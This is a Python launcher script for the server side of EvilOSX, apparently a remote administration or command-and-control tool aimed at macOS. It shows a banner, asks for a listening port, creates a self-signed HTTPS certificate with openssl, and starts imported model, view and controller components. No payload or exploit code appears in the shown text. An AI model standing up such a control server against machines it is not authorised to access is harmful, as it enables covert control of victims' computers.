#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Starts the server using the MVC pattern."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

from sys import exit
import os
import subprocess
from server.version import VERSION
from server.model import ClientModel
from server.view import View
from server.controller import Controller

BANNER = """\
▓█████ ██▒   █▓ ██▓ ██▓     ▒█████    ██████ ▒██   ██▒
▓█   ▀▓██░   █▒▓██▒▓██▒    ▒██▒  ██▒▒██    ▒ ▒▒ █ █ ▒░
▒███   ▓██  █▒░▒██▒▒██░    ▒██░  ██▒░ ▓██▄   ░░  █   ░
▒▓█  ▄  ▒██ █░░░██░▒██░    ▒██   ██░  ▒   ██▒ ░ █ █ ▒ 
░▒████▒  ▒▀█░  ░██░░██████▒░ ████▓▒░▒██████▒▒▒██▒ ▒██▒  @{} (v{})
░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒▒ ░ ░▓ ░
 ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░░░   ░▒ ░
   ░       ░░   ▒ ░  ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░    ░  
   ░  ░     ░   ░      ░  ░    ░ ░        ░   ░    ░  
""".format(__author__, VERSION)

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"


def generate_ca():
    """Generates the self-signed certificate authority."""
    if not os.path.exists("server.cert"):
        print(MESSAGE_INFO + "Generating certificate authority (HTTPS)...")

        information = "/C=US/ST=New York/L=Brooklyn/O=EvilOSX/CN=EvilOSX"
        subprocess.call("openssl req -newkey rsa:4096 -nodes -x509 -days 365 -subj \"{}\" -sha256 "
                        "-keyout server.key -out server.cert".format(information), shell=True)


def main():
    print(BANNER)

    while True:
        try:
            server_port = int(input(MESSAGE_INPUT + "Server port to listen on: "))
            break
        except ValueError:
            continue

    generate_ca()

    model = ClientModel()
    view = View()
    Controller(model, view, server_port)

    # Start the view (blocks until exit)
    view.start()

    print(MESSAGE_INFO + "Feel free to submit any issues or feature requests on GitHub.")
    print(MESSAGE_INFO + "Goodbye!")
    exit(0)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + MESSAGE_ATTENTION + "Interrupted.")
        exit(0)
